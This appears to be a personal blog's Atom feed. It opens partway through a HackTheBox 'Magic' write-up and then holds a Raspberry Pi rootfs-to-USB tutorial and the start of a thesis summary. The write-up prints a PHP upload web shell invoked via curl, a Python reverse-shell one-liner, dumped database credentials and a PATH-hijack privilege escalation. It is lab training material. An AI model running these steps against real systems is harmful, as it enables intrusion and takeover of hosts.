&lt;p&gt;This is where we use our second trick: &lt;strong&gt;double extensions&lt;/strong&gt;! I learned that a special (mis?)configuration in Apache servers would make the server execute any file as valid PHP as long as &lt;strong&gt;one of its extensions&lt;/strong&gt; is &amp;ldquo;&lt;code&gt;.php&lt;/code&gt;&amp;rdquo;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[&amp;hellip;] a file named filename.php.123, will be interpreted as a PHP file by Apache HTTP Server, and it will be executed. This of course, will only work if the last extension (in this case .123), is not specified in the list of MIME-types known to the web server&amp;hellip;If AddHandler directive is used, all filenames containing the .php extension ( .php, .php.jpg) will be executed as a PHP script.&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can then proudly save our file from above under the name &lt;code&gt;fake-img.php.jpg&lt;/code&gt; and it should do the trick!&lt;/p&gt;
&lt;p&gt;Once uploaded, let&amp;rsquo;s try to GET it using &lt;code&gt;curl&lt;/code&gt; and a simple system command like &lt;code&gt;id&lt;/code&gt; as an argument:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kali@kali:~$ curl &#39;http://10.10.10.185/images/uploads/fake-img.php.jpg/cmd=id&#39;
ï¿½ï¿½ï¿½ï¿½
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It works! This means we can probably get a shell as user &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;After having tried (and failed) to launch a &lt;strong&gt;netcat&lt;/strong&gt; reverse shell (probably not installed), we succesfully got a shell by passing to the &lt;code&gt;cmd&lt;/code&gt; argument (using Burp, because URL-encoding, because bash, because why not) the python3 one-liner from &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;PentestMonkey&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.18&amp;#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;pre&gt;&lt;code&gt;kali@kali:~$ nc -nlvp 1234
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.185] 37956
bash: cannot set terminal process group (1136): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/Magic/images/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in! ðð»&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;user&#34;&gt;User&lt;/h1&gt;
&lt;p&gt;Once we&amp;rsquo;re in, we might want to do some lateral movement&amp;hellip; Indeed, the &lt;code&gt;user.txt&lt;/code&gt; flag is in &lt;code&gt;/home/theseus&lt;/code&gt; and is only readable by the &lt;code&gt;theseus&lt;/code&gt; user.&lt;/p&gt;
&lt;h3 id=&#34;mysql-credentials&#34;&gt;MySQL Credentials&lt;/h3&gt;
&lt;p&gt;At the server root, we find a file &lt;code&gt;db.php5&lt;/code&gt; containing the MySQL credentials.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/var/www/Magic$ cat db.php5
&amp;lt;?php
class Database
{
    private static $dbName = &#39;Magic&#39; ;
    private static $dbHost = &#39;localhost&#39; ;
    private static $dbUsername = &#39;theseus&#39;;
    private static $dbUserPassword = &#39;iamkingtheseus&#39;;
[...]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But as you remember from above, we already have mapped the entire database, and the only useful information we found were the credentials of &lt;code&gt;admin&lt;/code&gt; for the login portal.&lt;/p&gt;
&lt;p&gt;Moreover, the binary &lt;code&gt;mysql&lt;/code&gt; (the MySQL CLI client) didn&amp;rsquo;t seem to be installed on the box, or might have been renamed, so I didn&amp;rsquo;t bother to take a second look at the database. I should have..&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I spent some unbelievable amount of time wondering why the only credentials I found associated with the user &amp;ldquo;theseus&amp;rdquo; (during the blind SQL dump) : &lt;code&gt;th3s3usw4sk1ng&lt;/code&gt; would not work with &lt;code&gt;su&lt;/code&gt;, and could not find any hint on how to get to this user account&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;dumping-the-database-wait-again&#34;&gt;Dumping the database (Wait? Again?)&lt;/h3&gt;
&lt;p&gt;This is where I decided to finally explore the MySQL database &amp;ldquo;manually&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;As said earlier, one can &lt;strong&gt;not&lt;/strong&gt; use the &lt;code&gt;mysql&lt;/code&gt; command line utility, which is missint from the the &lt;code&gt;/usr/bin&lt;/code&gt; directory, however we can connect to the DB using the same PHP logic as in &lt;code&gt;login.php&lt;/code&gt; or simply use the other tools from the MySQL package like &lt;code&gt;/usr/bin/mysqlshow&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:~$ mysqlshow -u &#39;theseus&#39; -p&#39;iamkingtheseus&#39;
mysqlshow: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;or (better)  &lt;code&gt;/usr/bin/mysqldump&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:~$ mysqldump -u &#39;theseus&#39; -p&#39;iamkingtheseus&#39; Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE=&#39;+00:00&#39; */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#39;NO_AUTO_VALUE_ON_ZERO&#39; */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;);
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-05-21 14:30:30
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this complete dump of the &amp;ldquo;&lt;code&gt;Magic&lt;/code&gt;&amp;rdquo; database, we find one line that could be interesting to us&amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is where I ð¤¦ââï¸, having totally forgot that MySQL string comparisons are case-insensitive.&lt;/p&gt;
&lt;h3 id=&#34;using-su&#34;&gt;Using su&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/$ su theseus 
Password: Th3s3usW4sK1ng
theseus@ubuntu:/$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So from the beggining, we had the correct password. Well. Almost the correct password&amp;hellip; ð¤·ââï¸&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root&#34;&gt;Root&lt;/h1&gt;
&lt;h3 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h3&gt;
&lt;p&gt;To get root, we didn&amp;rsquo;t need to look very far, we started our manual enumeration, like listing the files owned by &lt;code&gt;root&lt;/code&gt; and writable by &lt;code&gt;theseus&lt;/code&gt; or listening with &lt;a href=&#34;https://github.com/DominicBreuker/pspy&#34;&gt;pspy64&lt;/a&gt; for potential cron jobs executed by &lt;code&gt;root&lt;/code&gt;. But didn&amp;rsquo;t find any.&lt;/p&gt;
&lt;p&gt;Eventually, we listed the SUID programs and found one (&lt;code&gt;sysinfo&lt;/code&gt;) that triggered our interest:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;theseus@ubuntu:~$ find / -perm -4000 2&amp;gt;/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is even more interesting as it is the &lt;strong&gt;only&lt;/strong&gt; file on the machine which is owned by the group &amp;lsquo;users&amp;rsquo;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;theseus@ubuntu:~$ find / -group user -ls 2&amp;gt;/dev/null
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is a compiled binary, and we might want to use tools like &lt;a href=&#34;https://ghidra-sre.org/&#34;&gt;Ghidra&lt;/a&gt; or &lt;a href=&#34;http://cutter.re/&#34;&gt;Cutter.re&lt;/a&gt; to reverse-engineer it (that&amp;rsquo;s generaly the easiest way, once you know how to properly use these tools), but you could just also run it and from its output guessing that it must call some system functions to display system information and data.&lt;/p&gt;
&lt;p&gt;By looking at the output of pspy64 while you run &lt;code&gt;/bin/sysinfo&lt;/code&gt; you can actually see what system function the binary is calling, behind the hood:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;2020/05/22 00:41:19 CMD: UID=0    PID=6010   | sysinfo 
2020/05/22 00:41:19 CMD: UID=0    PID=6012   | lshw -short 
2020/05/22 00:41:19 CMD: UID=0    PID=6011   | sh -c lshw -short 
2020/05/22 00:41:20 CMD: UID=0    PID=6017   | fdisk -l 
2020/05/22 00:41:20 CMD: UID=0    PID=6016   | sh -c fdisk -l 
2020/05/22 00:41:21 CMD: UID=0    PID=6021   | free -h 
2020/05/22 00:41:21 CMD: UID=0    PID=6020   | sh -c free -h 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We observe that a few processes are spawned as &lt;code&gt;root&lt;/code&gt;, namely &lt;code&gt;lshw&lt;/code&gt;, &lt;code&gt;fdisk&lt;/code&gt; and &lt;code&gt;free&lt;/code&gt;. The binary is actually just calling them and displaying their output (as root).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Reverse-engineering the binary would also have showed that it was displaying the content of &lt;code&gt;/proc/cpuinfo&lt;/code&gt; using &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;exploiting-the-binsysinfo-binary&#34;&gt;Exploiting the /bin/sysinfo binary&lt;/h3&gt;
&lt;p&gt;The real issue here, is that the program is calling these above-mentioned functions in a non-safe way, i.e it is not using their fully defined paths:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/usr/bin/lshw&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/sbin/fdisk&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/usr/bin/free&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Hence, we could hijack the execution of this binary, by replacing one of this binary by one with &lt;strong&gt;the same name&lt;/strong&gt; somewhere above in our PATH. User &lt;code&gt;theseus&lt;/code&gt; executes this program as root, indeed, but these functions are still called relative to the &lt;code&gt;theseus&lt;/code&gt; environment (including its &lt;code&gt;$PATH&lt;/code&gt;) variable.&lt;/p&gt;
&lt;p&gt;Hence we can just create a bash script called &amp;ldquo;&lt;code&gt;free&lt;/code&gt;&amp;rdquo; in our home directory &lt;code&gt;/home/theseus/&lt;/code&gt; containing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Rooted!&amp;#34;&lt;/span&gt;
/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;And place our home directory at the top of our PATH:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;theseus@ubuntu:~$ export PATH=/home/theseus:$PATH
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now when we execute sysinfo, we get a nice surprise:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;theseus@ubuntu:~$ sysinfo
[...]
===============MEM Usage===============
root@ubuntu:~$ id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;We&amp;rsquo;re root!&lt;/strong&gt; â ï¸&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Double Extension + Magic Bytes trick: &lt;a href=&#34;https://davidhamann.de/2019/12/04/htb-writeup-networked/&#34;&gt;https://davidhamann.de/2019/12/04/htb-writeup-networked/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;What is SUID/SGID: &lt;a href=&#34;https://docstore.mik.ua/orelly/other/puis3rd/0596003234_puis3-chp-6-sect-5.html&#34;&gt;https://docstore.mik.ua/orelly/other/puis3rd/0596003234_puis3-chp-6-sect-5.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Privesc through modifying PATH variable: &lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&#34;&gt;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://www.acunetix.com/websitesecurity/upload-forms-threat/&#34;&gt;https://www.acunetix.com/websitesecurity/upload-forms-threat/&lt;/a&gt; &lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://alexconnat.github.io/categories/hacking/" term="Hacking" label="Hacking" />
                            
                        
                            
                            
                            
                                <category scheme="https://alexconnat.github.io/categories/write-ups/" term="Write-Ups" label="Write-Ups" />
                            
                        
                            
                            
                            
                                <category scheme="https://alexconnat.github.io/categories/htb/" term="HTB" label="HTB" />
                            
                        
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Tutorial: How to move the rootfs partition on a Raspberry Pi to a USB flash drive</title>
            <link rel="alternate" type="text/html" href="https://alexconnat.github.io/posts/move-rootfs-partition-to-usb-drive-on-rpi/" />
            <id>https://alexconnat.github.io/posts/move-rootfs-partition-to-usb-drive-on-rpi/</id>
            <updated>2020-07-09T19:39:09&#43;02:00</updated>
            <published>2019-11-19T18:00:00&#43;02:00</published>
            <author>
                    <name>Alex Connat</name>
                    <uri>https://alexconnat.github.io/</uri>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">I own a Raspberry Pi 3 model B+ and I came across a problem that I didn&amp;rsquo;t see that often: I wanted to move the rootfs partition (that is to say, the location on which the root filesystem is physically located) from the SD card, to a USB flash drive.</summary>
            
                <content type="html">&lt;p&gt;I own a Raspberry Pi 3 model B+ and I came across a problem that I didn&amp;rsquo;t see that often: I wanted to move the rootfs partition (that is to say, the location on which the root filesystem is physically located) from the SD card, to a USB flash drive.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NB:&lt;/strong&gt; In this tutorial, I do not change the boot mode of the Raspberry Pi, meaning that it will &lt;strong&gt;still&lt;/strong&gt; boot from the SD card, but it will mount the linux filesystem on the USB drive.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A Raspberry Pi traditionally boots from a SD card, and has two partitions on this card: the &lt;code&gt;boot&lt;/code&gt; partition (quite small) and the &lt;code&gt;rootfs&lt;/code&gt; partition (that takes up the remaining storage space of the SD card). I wanted to move this rootfs partition to the USB drive, to make use of its bigger storage space.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In my case, when I bought and set up my RPi, I just used an old 2GB SD card, and I thought it would be enough to support a light operating system like Raspbian. Unfortunately, I quickly realised that to store additional binaries and install some more libraries (thus, creating files in &lt;code&gt;/opt&lt;/code&gt;, in &lt;code&gt;/etc&lt;/code&gt; and some additional log files in &lt;code&gt;/var/log&lt;/code&gt;), my 2 Gigabytes were not enough&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;You can plug a USB drive, or an external drive to increase your storage space (for instance, for storing pictures, or movies), but this will never &lt;strong&gt;replace&lt;/strong&gt; having a bigger rootfs partition, i.e more space for the OS to use. As I only found very few references online that showed the steps to do so, I decided to write my own tutorial.&lt;/p&gt;
&lt;p&gt;I had this useless 16GB USB drive lying around, and I thought it would be the perfect candidate to replace this old 2GB SD card.&lt;/p&gt;
&lt;p&gt;Without further ado, let&amp;rsquo;s jump straight in! Here are the steps I followed:&lt;/p&gt;
&lt;h3 id=&#34;1-turn-on-your-rpi-with-only-the-sd-card-plugged-in&#34;&gt;1) Turn on your RPi with only the SD Card plugged in&lt;/h3&gt;
&lt;p&gt;Till now, no big deal. It should boot normally, as you&amp;rsquo;re used to.&lt;/p&gt;
&lt;h3 id=&#34;2-plug-your-empty-drive-inside-the-rpi&#34;&gt;2) Plug your (empty) drive inside the RPi&lt;/h3&gt;
&lt;p&gt;You can list the disks using the command &lt;code&gt;lsblk&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It should be recognized as &lt;code&gt;/dev/sda&lt;/code&gt;, and (if you never used it) should only have 1 full partition: &lt;code&gt;/dev/sda1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If it&amp;rsquo;s a USB drive or an external drive that you already used, you can wipe it and format it, but it shouldn&amp;rsquo;t make a difference as the next step will wipe it and format it anyways!&lt;/p&gt;
&lt;h3 id=&#34;3-backup-your-current-filesystem-from-the-sd-card-to-the-new-drive-using-dd&#34;&gt;3) Backup your current filesystem from the SD card to the new drive using &lt;code&gt;dd&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;dd if=/dev/mmcblk0 of=/dev/sda bs=4M status=progress
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This command will copy the whole state and content of your current filesystem from the SD card to your newly plugged drive. It could take some time to complete.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As a sanity check: if you run &lt;code&gt;lsblk&lt;/code&gt; and &lt;code&gt;sudo blkid&lt;/code&gt;, you should now see that &lt;code&gt;/dev/sda1&lt;/code&gt; and &lt;code&gt;/dev/sda2&lt;/code&gt; on your USB drive perfectly replicate the &lt;u&gt;boot&lt;/u&gt; and &lt;u&gt;rootfs&lt;/u&gt; partitions &lt;code&gt;/dev/mmcblk0p0&lt;/code&gt; and &lt;code&gt;/dev/mmcblk0p1&lt;/code&gt; from the SD card.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;WARNING:&lt;/strong&gt; There is (or might be) still be a problem: In most cases, &lt;code&gt;dd&lt;/code&gt; &lt;u&gt;exactly&lt;/u&gt; replicate the partitions, meaning that they might still have &lt;u&gt;the same PARTUUID&lt;/u&gt;&amp;hellip;
As its name indicates, this UUID needs to be.. well.. unique! The first reason being that it is &lt;em&gt;this ID&lt;/em&gt; that you give to the operating system while booting, in order to decide &lt;u&gt;which&lt;/u&gt; disk to use to mount the filesystem on.&lt;/p&gt;
&lt;h3 id=&#34;4-change-the-partuuid-of-devsda-using-fdisk&#34;&gt;4) Change the PARTUUID of &lt;code&gt;/dev/sda&lt;/code&gt; using &lt;code&gt;fdisk&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;In my case, the PARTUUID for both disks was &lt;code&gt;9b1c6f5e&lt;/code&gt;. I will change the one from my USB drive to &lt;code&gt;d3adb33f&lt;/code&gt; (because why not) using the advanced options of the cmd line utility &lt;code&gt;fdisk&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo fdisk /dev/sda
x  # expert options
i  # change the disk identifier
&amp;lt;enter the new partuuid in decimal&amp;gt; (here we enter 3551376191, the decimal value of 0xd3adb33f)
r
w
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;5-change-the-rootfs-partuuid-in-bootcmdlinetxt&#34;&gt;5) Change the rootfs PARTUUID in &lt;code&gt;/boot/cmdline.txt&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;This file, in &lt;code&gt;/boot&lt;/code&gt; (the boot partition on the SD card) tells the system to mount the linux root filesystem on the disk with given PARTUUID.&lt;/p&gt;
&lt;p&gt;So, in this file, instead of:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dwc_otg.lpm_enable=0 console=serial0,115200 console=tty1 root=PARTUUID=9b1c6f5e-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We will write:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dwc_otg.lpm_enable=0 console=serial0,115200 console=tty1 root=PARTUUID=d3adb33f-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Just in case you want to revert your initial configuration, you can save the old cmdline file as &lt;code&gt;cmdline.txt.bak&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;6-reboot-the-rpi&#34;&gt;6) Reboot the RPi&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;sudo reboot
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will safely reboot the device. It will boot from the SD card (as always), but then, mount the root filesystem onto your new USB drive, as intended. From now on, make sure to leave it plugged at all time on the same USB port.&lt;/p&gt;
&lt;h3 id=&#34;7-expand-the-filesystem-partition&#34;&gt;7) Expand the filesystem partition&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Last little problem: Our SD card was &lt;strong&gt;2GB&lt;/strong&gt;, and &lt;code&gt;dd&lt;/code&gt; copied it &lt;u&gt;identically&lt;/u&gt;, making the new partition on the USB drive.. also 2GB! We want to expand our partition so that it occupies all the (e.g 16GB) of our USB drive&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There is an option to do that in &lt;code&gt;raspi-config&lt;/code&gt; : If you go to &amp;ldquo;Advanced Options &amp;gt; Expand Filesystem&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;However, you should get a warning &lt;em&gt;&amp;quot;/dev/sda is not on a SD card, cannot expand filesystem&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This is because the name of partition for the SD card is hardcoded in the &lt;code&gt;raspi-config&lt;/code&gt; script, and that you&amp;rsquo;re not supposed to mount your filesystem on something &lt;strong&gt;else&lt;/strong&gt;. However, we can circumvent this limitation by just running a few lines:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cp /usr/bin/raspi-config ~    						# Copy the raspi-config script in your home folder
sed -i &#39;s/mmcblk0p/sda/&#39; ~/raspi-config
sed -i &#39;s/mmcblk0/sda/&#39; ~/raspi-config    # Substitute mmcblk0 for sda everywhere
sudo ~/raspi-config                       # Run it, and Profit :)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;8-there-is-no-step-8&#34;&gt;8) There is no Step 8&lt;/h3&gt;
&lt;p&gt;VoilÃ ! You now have a bigger amount of space to put all your libraries and binaries on!&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text">A Differentially-Private Decentralized Machine Learning Framework</title>
            <link rel="alternate" type="text/html" href="https://alexconnat.github.io/posts/master-thesis/" />
            <id>https://alexconnat.github.io/posts/master-thesis/</id>
            <updated>2020-08-04T17:38:51&#43;02:00</updated>
            <published>2019-09-10T18:00:00&#43;02:00</published>
            <author>
                    <name>Alex Connat</name>
                    <uri>https://alexconnat.github.io/</uri>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">â Master&amp;rsquo;s Thesis 2019 - ETH/EPFL - Alexandre Connat
Introduction - Outline In this article, I will try to give the reader a high overview of my Master Thesis: &amp;ldquo;A Differentially-Private Decentralized Machine Learning Framework&amp;rdquo;, realized in 2019 at the Distributed Systems Group (DSG), ETH ZÃ¼rich.</summary>
            
                <content type="html">&lt;hr&gt;
&lt;p&gt;â                                                                                                   Master&amp;rsquo;s Thesis 2019 - ETH/EPFL - Alexandre Connat&lt;/p&gt;
&lt;h2 id=&#34;introduction---outline&#34;&gt;Introduction - Outline&lt;/h2&gt;
&lt;p&gt;In this article, I will try to give the reader a high overview of my Master Thesis: &amp;ldquo;A Differentially-Private Decentralized Machine Learning Framework&amp;rdquo;, realized in 2019 at the Distributed Systems Group (DSG), ETH ZÃ¼rich.&lt;/p&gt;
&lt;p&gt;There are three important part in this somewhat complicated title, that I will try to break down and explain in simpler terms:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First, we will describe what &amp;ldquo;&lt;strong&gt;Decentralized Machine Learning&lt;/strong&gt;&amp;rdquo; means, and why is it currently such a &amp;ldquo;hot&amp;rdquo; topic.&lt;/li&gt;
